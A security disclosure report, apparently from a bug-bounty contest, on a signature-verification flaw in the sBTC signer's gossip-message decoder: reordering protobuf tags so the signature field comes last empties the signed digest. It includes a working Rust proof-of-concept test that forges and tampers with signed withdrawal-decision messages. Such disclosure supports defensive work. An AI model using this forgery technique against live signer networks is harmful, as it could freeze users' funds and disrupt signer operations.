# #38223 \[BC-Insight] Attackers can disrupt the tag order of gossip messages to bypass signature verif

**Submitted on Dec 28th 2024 at 07:32:03 UTC by @f4lc0n for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38223
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Permanent freezing of funds (fix requires hardfork)
  * API crash preventing correct processing of deposits

## Description

## Brief/Intro

When the signer processes a gossip message, it verifies the signature of the source of the message. This prevents attackers from forwarding tampered messages.

The signer determines where the digest starts based on *tag 1* of the message. However, an attacker can customize the position of *tag 1* to customize the position where the digest starts.

## Vulnerability Details

The `decode_with_digest` code is as follows.

```rust
    pub fn decode_with_digest(data: &[u8]) -> Result<(Self, [u8; 32]), Error> {
        let mut buf = data;
        let mut pre_hash_data = data;

        // This is almost exactly what prost does when decoding protobuf
        // bytes.
        let mut message = proto::Signed::default();
        let ctx = prost::encoding::DecodeContext::default();

        while buf.has_remaining() {
            let (tag, wire_type) =
                prost::encoding::decode_key(&mut buf).map_err(Error::DecodeProtobuf)?;
            message
                .merge_field(tag, wire_type, &mut buf, ctx.clone())
                .map_err(Error::DecodeProtobuf)?;
            // This part here is not in prost. The purpose is to note the
            // pre-hashed-data that is hashed and then signed, and the
            // underlying assumption is that all non-signature field bytes
            // are signed. The approach here assumes that protobuf fields
            // are serialized in order of their tag and the field with tag
            // 1 is the signature field. We copy a reference to the
            // remaining bytes because these bytes were used to create the
            // digest that was signed over.
            if tag == 1 {
                pre_hash_data = buf;
            }
        }

        // Okay now we transform the protobuf type into our local type.
        let msg = Signed::<SignerMessage>::try_from(message)?;
        // Now we construct the digest that was signed over.
        let mut hasher = sha2::Sha256::new_with_prefix(msg.type_tag());
        hasher.update(pre_hash_data);

        Ok((msg, hasher.finalize().into()))
    }
```

The `pre_hash_data` is used to mark the beginning of the digest. As long as `tag` is 1, the `pre_hash_data` will be reassigned to the current `buf`. Therefore, we can determine that the expected message structure is:

```
+--------------------------------+
| tag = 1, signature data        |
+--------------------------------+    >>>>> digest start
| tag = 2, <field 2> data        |
+--------------------------------+
| ...                            |
+--------------------------------+
| tag = x, <field x> data        |
+--------------------------------+
                                      >>>>> digest end
```

However, the attacker can manipulate the digest content by disrupting the order of tags. As shown in the figure below.

```
+--------------------------------+
| tag = 2, <field 2> data        |
+--------------------------------+
| ...                            |
+--------------------------------+
| tag = x, <field x> data        |
+--------------------------------+
| tag = 1, signature data        |
+--------------------------------+    >>>>> digest start
                                      >>>>> digest end
```

The attacker can put *tag 1* at the end of the message. Then when `decode_with_digest` finds *tag 1*, it will assign `pre_hash_data` to the current `buf`, which is the end of the message, and the digest content will be empty.

Fortunately, the signer will add a prefix to all digests. So, for an attacker, he needs to induce other signers to sign a signature with only a prefix like `"SBTC_SIGNER_WITHDRAWAL_DECISION"`. Then the attacker can use this signature to forge any `SignerWithdrawalDecision` message.

## Fix

It is recommended to put the signature field first in the message instead of allowing the message to customize the signature field position.

## Impact Details

This bug allows a signer to spread gossip messages as other signers. He can spread wrong `SignerDepositDecision`, `SignerWithdrawalDecision` (which can freeze the user's sBTC) and `WstsMessage` (which can prevent new signer set) messages.

However, this bug requires the attacker to be one of the signers (only signers can forward gossip) and requires the signer to induce other signers to sign a signature with only the prefix. So, I consider this bug to be a **Medium**.

## References

None

## Proof of Concept

## Proof of Concept

Add this test case to `signer/src/ecdsa.rs`. This PoC demonstrates that after obtaining the `"SBTC_SIGNER_WITHDRAWAL_DECISION"` signature, it is possible to forge any `SignerWithdrawalDecision` message.

```diff
+    #[test]
+    fn poc_bypass_sign() {
+        let test_private_key_buff: Vec<u8> = vec![
+            0xb5, 0x8c, 0x50, 0xc5, 0x44, 0x42, 0x5f, 0xcc,
+            0x12, 0x3d, 0xe1, 0xfa, 0x15, 0x56, 0x05, 0x2f,
+            0x61, 0x15, 0x35, 0xc2, 0x36, 0x05, 0xcf, 0x84,
+            0x0d, 0xbe, 0xa5, 0x5a, 0x16, 0x84, 0x9e, 0xbe,
+        ];
+        let test_public_key_buff: Vec<u8> = vec![
+            0x0a, 0x24, 0x09, 0xd0, 0xdc, 0x93, 0x19, 0x70,
+            0x77, 0x30, 0xf3, 0x11, 0xc7, 0x92, 0x40, 0x72,
+            0x21, 0xe5, 0x5e, 0xda, 0x19, 0x58, 0x49, 0xa3,
+            0x12, 0xf2, 0xf3, 0x45, 0x7e, 0x21, 0x4f, 0x43,
+            0xa9, 0x90, 0x11, 0x82, 0x4c, 0x42, 0x10, 0x01,
+        ];
+        let keypair = secp256k1::Keypair::from_seckey_slice(secp256k1::SECP256K1, &test_private_key_buff.to_vec()).unwrap();
+        let private_key: PrivateKey = keypair.secret_key().into();
+        let public_key: PublicKey = keypair.public_key().into();
+        assert_eq!(public_key.encode_to_vec(), test_public_key_buff);
+
+        // the signature of "SBTC_SIGNER_WITHDRAWAL_DECISION"
+        let mut hasher = sha2::Sha256::new_with_prefix("SBTC_SIGNER_WITHDRAWAL_DECISION");
+        hasher.update(Vec::new());
+        let empty_prefix_hash = secp256k1::Message::from_digest(hasher.finalize().into());
+        let empty_prefix_sign: Vec<u8> = proto::EcdsaSignature::from(private_key.sign_ecdsa(&empty_prefix_hash)).encode_length_delimited_to_vec();
+        // println!("empty_prefix_sign.len(): {:?}", empty_prefix_sign.len());
+        // println!("empty_prefix_sign: {:02x?}", empty_prefix_sign);
+
+        // test message data
+        let test_data_tag_1_key: Vec<u8> = vec![0b00001010]; // tag1: signature
+        let test_data_tag_1_data: Vec<u8> = vec![
+            0x4c, 0x0a, 0x24, 0x09, 0xef, 0x3f, 0x52, 0x97,
+            0xca, 0x50, 0xc1, 0x07, 0x11, 0x82, 0x80, 0x41,
+            0x63, 0xae, 0x7f, 0x8f, 0xf9, 0x19, 0x60, 0xd9,
+            0xe2, 0x15, 0x03, 0x86, 0xe4, 0xe5, 0x21, 0x61,
+            0x44, 0xe5, 0x8c, 0xef, 0x66, 0x0b, 0xd1, 0x12,
+            0x24, 0x09, 0x26, 0x64, 0xdb, 0xd4, 0x22, 0xdd,
+            0x97, 0xed, 0x11, 0x1e, 0xea, 0xc9, 0xf3, 0x5a,
+            0x80, 0x54, 0x40, 0x19, 0x35, 0x66, 0x84, 0xeb,
+            0x88, 0xc8, 0xf0, 0x2f, 0x21, 0x77, 0x94, 0x99,
+            0x61, 0x3b, 0xb1, 0xe6, 0x8e,
+        ];
+        let test_data_tag_2_key: Vec<u8> = vec![0b00010010]; // tag2: signer_public_key
+        let test_data_tag_2_data: Vec<u8> = vec![
+            0x28, 0x0a, 0x24, 0x09, 0xd0, 0xdc, 0x93, 0x19,
+            0x70, 0x77, 0x30, 0xf3, 0x11, 0xc7, 0x92, 0x40,
+            0x72, 0x21, 0xe5, 0x5e, 0xda, 0x19, 0x58, 0x49,
+            0xa3, 0x12, 0xf2, 0xf3, 0x45, 0x7e, 0x21, 0x4f,
+            0x43, 0xa9, 0x90, 0x11, 0x82, 0x4c, 0x42, 0x10,
+            0x01,
+        ];
+        let test_data_tag_3_key: Vec<u8> = vec![0b00011010]; // tag3: signer_message
+        let test_data_tag_3_data: Vec<u8> = vec![
+            0x87, 0x01, 0x0a, 0x26, 0x0a, 0x24, 0x09, 0x01,
+            0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x11,
+            0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
+            0x19, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
+            0x01, 0x21, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
+            0x01, 0x01, 0x1a, 0x5d, 0x08, 0xd5, 0xb7, 0x9e,
+            0x9e, 0x9e, 0xcf, 0xd4, 0xb7, 0xf0, 0x01, 0x12,
+            0x26, 0x0a, 0x24, 0x09, 0x38, 0xa0, 0x2d, 0x3f,
+            0x16, 0x93, 0xd5, 0x0e, 0x11, 0x2a, 0xde, 0xd5,
+            0x78, 0x7b, 0x93, 0x8a, 0x9e, 0x19, 0x45, 0x66,
+            0x60, 0x5c, 0x3b, 0xab, 0xdd, 0x0e, 0x21, 0xc3,
+            0x93, 0x81, 0x21, 0xbe, 0x53, 0x60, 0xc9, 0x1a,
+            0x26, 0x0a, 0x24, 0x09, 0x29, 0x88, 0x6c, 0x2b,
+            0xdd, 0xbd, 0x8f, 0x29, 0x11, 0x9c, 0xaf, 0x39,
+            0xcc, 0x6e, 0x17, 0xc3, 0xee, 0x19, 0xe0, 0xb4,
+            0x6a, 0xd8, 0x65, 0x8e, 0x39, 0x8d, 0x21, 0x6e,
+            0x45, 0xa3, 0x58, 0x15, 0x55, 0x2a, 0xc8, 0x20,
+            0x01,
+        ];
+
+        // >>>>>>>>>> test correct case
+        let mut test_data_correct = Vec::new();
+        test_data_correct.extend(test_data_tag_1_key.clone());
+        test_data_correct.extend(test_data_tag_1_data.clone());
+        test_data_correct.extend(test_data_tag_2_key.clone());
+        test_data_correct.extend(test_data_tag_2_data.clone());
+        test_data_correct.extend(test_data_tag_3_key.clone());
+        test_data_correct.extend(test_data_tag_3_data.clone());
+        let (msg_correct, digest_correct) = Signed::<SignerMessage>::decode_with_digest(&test_data_correct).unwrap();
+        // println!("digest_correct: {:?}", digest_correct);
+        // println!("msg_correct: {:?}", msg_correct);
+        msg_correct.verify_digest(digest_correct).unwrap();
+        assert_eq!(msg_correct.signer_public_key, keypair.public_key().into());
+
+        // >>>>>>>>>> test hack case 1
+        //   bypass verify with the signature of "SBTC_SIGNER_WITHDRAWAL_DECISION"
+        let mut test_data_hack1 = Vec::new();
+        test_data_hack1.extend(test_data_tag_2_key.clone());
+        test_data_hack1.extend(test_data_tag_2_data.clone());
+        test_data_hack1.extend(test_data_tag_3_key.clone());
+        test_data_hack1.extend(test_data_tag_3_data.clone());
+        test_data_hack1.extend(test_data_tag_1_key.clone());
+        test_data_hack1.extend(empty_prefix_sign.clone());
+        let (msg_hack1, digest_hack1) = Signed::<SignerMessage>::decode_with_digest(&test_data_hack1).unwrap();
+        // println!("digest_hack1: {:?}", digest_hack1);
+        // println!("msg_hack1: {:?}", msg_hack1);
+        msg_hack1.verify_digest(digest_hack1).unwrap();
+        assert_eq!(msg_hack1.signer_public_key, keypair.public_key().into());
+
+        // >>>>>>>>>> test hack case 2
+        //   change any content in the message
+        //   bypass verify with the signature of "SBTC_SIGNER_WITHDRAWAL_DECISION"
+        let mut test_data_hack2 = Vec::new();
+        test_data_hack2.extend(test_data_tag_2_key.clone());
+        test_data_hack2.extend(test_data_tag_2_data.clone());
+        test_data_hack2.extend(test_data_tag_3_key.clone());
+        let mut test_data_tag_3_data_tampering = test_data_tag_3_data.clone();
+        test_data_tag_3_data_tampering[10] = 0;
+        test_data_tag_3_data_tampering[11] = 0;
+        test_data_tag_3_data_tampering[12] = 0;
+        test_data_hack2.extend(test_data_tag_3_data_tampering.clone());
+        test_data_hack2.extend(test_data_tag_1_key.clone());
+        test_data_hack2.extend(empty_prefix_sign.clone());
+        let (msg_hack2, digest_hack2) = Signed::<SignerMessage>::decode_with_digest(&test_data_hack2).unwrap();
+        // println!("digest_hack2: {:?}", digest_hack2);
+        // println!("msg_hack2: {:?}", msg_hack2);
+        msg_hack2.verify_digest(digest_hack2).unwrap();
+        assert_eq!(msg_hack2.signer_public_key, keypair.public_key().into());
+    }
```

Run the test case:

```sh
cargo test --package signer --lib -- ecdsa::tests::poc_bypass_sign --exact --show-output 
```
